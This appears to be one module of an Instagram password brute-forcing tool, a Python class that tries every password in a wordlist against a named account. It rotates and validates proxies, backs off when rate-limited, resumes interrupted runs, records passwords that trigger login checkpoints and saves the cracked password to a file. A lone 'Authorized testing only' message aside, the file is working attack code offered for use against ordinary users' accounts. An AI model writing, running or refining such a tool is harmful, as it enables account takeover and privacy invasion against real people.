#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Brute force engine with live progress bar style output."""

import json
import os
import random
import sys
import time
from .api import InstagramAPI
from .proxy import ProxyManager
from .banner import info, ok, warn, err, C


class BruteEngine:
    """Password testing with proxy rotation, resume, and ETA progress."""

    def __init__(
        self,
        username,
        wordlist_path,
        output_dir="output",
        delay_min=3.0,
        delay_max=5.0,
        proxy=None,
        proxy_file=None,
        resume=False,
    ):
        self.username = username.strip().lstrip("@")
        self.wordlist_path = wordlist_path
        self.output_dir = output_dir
        self.delay_min = float(delay_min)
        self.delay_max = float(delay_max)

        self.proxy_mgr = ProxyManager(proxy_file=proxy_file, proxy_url=proxy)
        if self.proxy_mgr.count:
            self.proxy_mgr.validate_all()

        self.api = InstagramAPI()
        self._found = None
        self._tried = set()
        self._cursor = 0
        self._checkpoints = []

        os.makedirs(os.path.join(output_dir, self.username), exist_ok=True)
        self.progress_file = os.path.join(
            output_dir, self.username, "progress.json"
        )
        self.found_file = os.path.join(
            output_dir, self.username, "found.txt"
        )
        self.checkpoint_file = os.path.join(
            output_dir, self.username, "checkpoints.txt"
        )

        if resume:
            self._load_progress()

    def _load_progress(self):
        try:
            with open(self.progress_file, "r", encoding="utf-8") as f:
                data = json.load(f)
            self._tried = set(data.get("tried", []))
            self._cursor = int(data.get("cursor", 0))
            info(f"Resumed: cursor={self._cursor}, tried={len(self._tried)}")
        except Exception:
            pass

    def _save_progress(self):
        try:
            with open(self.progress_file, "w", encoding="utf-8") as f:
                json.dump(
                    {
                        "tried": list(self._tried)[-15000:],
                        "cursor": self._cursor,
                        "found": self._found,
                    },
                    f,
                )
        except Exception:
            pass

    def _print_progress(self, i, total, password, start, extra=""):
        elapsed = max(time.time() - start, 0.001)
        rate = i / elapsed
        remaining = max(total - i, 0)
        eta = int(remaining / rate) if rate > 0 else 0
        pct = (i / total) * 100 if total else 0
        h, r = divmod(eta, 3600)
        m, s = divmod(r, 60)
        eta_s = f"{h}h{m:02d}m" if h else f"{m}m{s:02d}s"
        pwd_show = password if len(password) <= 28 else password[:25] + "..."
        line = (
            f"\r{C.C}[{i}/{total}]{C.E} "
            f"{pct:5.1f}% | "
            f"{rate:4.2f}/s | "
            f"ETA {eta_s} | "
            f"pwd: {C.Y}{pwd_show}{C.E}"
            f"{extra}   "
        )
        sys.stdout.write(line)
        sys.stdout.flush()

    def run(self):
        passwords = []
        try:
            with open(
                self.wordlist_path, "r", encoding="utf-8", errors="ignore"
            ) as f:
                for line in f:
                    pw = line.strip()
                    if pw and pw not in self._tried:
                        passwords.append(pw)
        except FileNotFoundError:
            err(f"Wordlist not found: {self.wordlist_path}")
            return None

        if not passwords:
            warn("No new passwords to test (empty or all already tried)")
            return self._load_result()

        total = len(passwords)
        print()
        info(f"Target: @{self.username}")
        info(f"Total passwords: {total}")
        info(f"Already tested: {len(self._tried)}")
        info(
            f"Delay: {self.delay_min}-{self.delay_max}s | "
            f"proxies alive: {self.proxy_mgr.alive_count}"
        )
        warn("Authorized testing only.")
        print()

        start = time.time()
        i_done = 0

        try:
            for password in passwords:
                if self._found:
                    break

                self._cursor += 1
                i_done += 1
                self._tried.add(password)

                proxy_url = self.proxy_mgr.get_next()
                if proxy_url:
                    self.api.proxy = self.proxy_mgr.get_proxies_dict(proxy_url)

                result = self.api.try_login(self.username, password)
                extra = ""

                if result.get("success"):
                    self._found = password
                    print()
                    ok(f"FOUND → {password}")
                    break

                st = result.get("status", "")
                if st == "checkpoint":
                    self._checkpoints.append(password)
                    try:
                        with open(
                            self.checkpoint_file, "a", encoding="utf-8"
                        ) as cf:
                            cf.write(password + "\n")
                    except Exception:
                        pass
                    extra = f" | {C.Y}CHECKPOINT{C.E}"
                elif st == "rate_limited":
                    extra = f" | {C.R}RATE LIMIT{C.E}"
                    self._print_progress(
                        i_done, total, password, start, extra
                    )
                    time.sleep(random.uniform(40, 90))
                elif st == "invalid_user":
                    print()
                    err("Username not found — stopping")
                    break
                elif st in ("timeout", "connection_error"):
                    extra = f" | {C.R}{st}{C.E}"
                    if proxy_url:
                        self.proxy_mgr.mark_dead(proxy_url)

                self._print_progress(i_done, total, password, start, extra)

                if i_done % 25 == 0:
                    self._save_progress()

                time.sleep(
                    random.uniform(self.delay_min, self.delay_max)
                )

        except KeyboardInterrupt:
            print()
            warn("Interrupted — progress saved")
            self._save_progress()
            return self._found

        print()
        self._save_progress()
        elapsed = time.time() - start
        print(f"{C.C}{'═' * 48}{C.E}")
        print(
            f"  Done @{self.username} | {i_done} tried | {elapsed:.0f}s"
        )
        print(f"  Found: {self._found or 'none'}")
        print(f"  Checkpoints: {len(self._checkpoints)}")
        if self._checkpoints:
            print(f"  Checkpoint file: {self.checkpoint_file}")
        print(f"{C.C}{'═' * 48}{C.E}")

        if self._found:
            try:
                with open(self.found_file, "w", encoding="utf-8") as f:
                    f.write(self._found)
                ok(f"Saved → {self.found_file}")
            except Exception as e:
                err(f"Could not save found password: {e}")
        return self._found

    def _load_result(self):
        try:
            with open(self.found_file, "r", encoding="utf-8") as f:
                return f.read().strip()
        except Exception:
            return None
